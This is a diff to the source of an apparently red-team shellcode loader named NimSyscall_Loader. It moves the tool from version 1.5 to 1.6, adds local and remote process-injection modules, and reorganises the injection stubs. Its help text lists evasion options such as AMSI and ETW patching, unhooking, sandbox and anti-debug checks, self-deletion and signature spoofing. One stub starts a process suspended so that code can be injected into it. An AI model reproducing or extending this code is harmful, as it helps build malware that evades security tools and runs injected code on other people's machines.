@@ -26,6 +26,8 @@ import SandboxStubs
 import Whispers
 import SleepyCryptSleep
 import PELoad
+import CurrentProcInject
+import RemoteProcInject
 
 
 from system import io
@@ -47,7 +49,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.5                                            
+                                                                 v1.6                                            
 
 """
 
@@ -56,7 +58,7 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.5
+NimSyscall_Loader v 1.6
 
 Usage:
   NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
@@ -207,7 +209,7 @@ var
     noRES: bool = false
     antidebug: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.6")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -978,7 +980,7 @@ SleepyCryptLoop(10000)
 """
 
 let NotepadProcIDStub * = fmt"""
-
+import osproc
 # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
 let tProcess = startProcess(obf("{customspawnprocess}"))
 tProcess.suspend() # That's handy!
@@ -1142,29 +1144,25 @@ if (peload):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(HellsgateRemotePatchAMSIStub)
-                stub.add(HellsShellcoderemoteinjectStub_notepad)
-                stub.add(HellsShellcoderemoteinjectStub)
+                stub.add(ShellcoderemoteinjectStub_notepad)
             else:
-                stub.add(HellsShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
-                stub.add(HellsShellcoderemoteinjectStub_customprocID)
+                stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(HellsgateRemotePatchAMSIStub)
-                stub.add(HellsShellcoderemoteinjectStub_customprocthird)
-                stub.add(HellsShellcoderemoteinjectStub)
+                stub.add(ShellcoderemoteinjectStub_customprocthird)
+            stub.add(ShellcoderemoteinjectStub)
 
 if (shellcode):
     if (localinject):
         if (getfreshstub):
             stub.add(LocalInjectDelegates)
-            stub.add(ShellcodelocalStub)
         if (hellsgate):
             stub.add(HellsgateAllocDelegate)
-            stub.add(HellsgateLocalInjectStub)
-        elif(syswhispers):
-            stub.add(WhispersLocalInjectStub)
+        stub.add(LocalInjectStub)
     else:
         stub.add(Winimleanstub)
         if (getfreshstub):
@@ -1179,18 +1177,16 @@ if (shellcode):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(HellsgateRemotePatchAMSIStub)
-                stub.add(HellsShellcoderemoteinjectStub_notepad)
-                stub.add(HellsShellcoderemoteinjectStub)
+                stub.add(ShellcoderemoteinjectStub_notepad)
             else:
-                stub.add(HellsShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
-                stub.add(HellsShellcoderemoteinjectStub_customprocID)
+                stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(HellsgateRemotePatchAMSIStub)
-                stub.add(HellsShellcoderemoteinjectStub_customprocthird)
-                stub.add(HellsShellcoderemoteinjectStub)
+                stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif(syswhispers):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
@@ -1198,18 +1194,16 @@ if (shellcode):
                     stub.add(WhispersRemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(WhispersRemotePatchAMSIStub)
-                stub.add(WhispersShellcoderemoteinjectStub_notepad)
-                stub.add(WhispersShellcoderemoteinjectStub)
+                stub.add(ShellcoderemoteinjectStub_notepad)
             else:
-                stub.add(WhispersShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
-                stub.add(WhispersShellcoderemoteinjectStub_customprocID)
+                stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
                     stub.add(WhispersRemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(WhispersRemotePatchAMSIStub)
-                stub.add(WhispersShellcoderemoteinjectStub_customprocthird)
-                stub.add(WhispersShellcoderemoteinjectStub)
+                stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif (getfreshstub):
             stub.add(RemoteInjectDelegates)
             if (processname == ""):
@@ -1221,7 +1215,6 @@ if (shellcode):
                     stub.add(RemoteLoadAMSIStub)
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_notepad)
-                stub.add(ShellcoderemoteinjectStub)
             else:
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
@@ -1233,7 +1226,8 @@ if (shellcode):
                     stub.add(RemoteLoadAMSIStub)
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
-                stub.add(ShellcoderemoteinjectStub)
+            
+        stub.add(ShellcoderemoteinjectStub)
 
 if (csharp):
     stub.add(AssemblyImports)
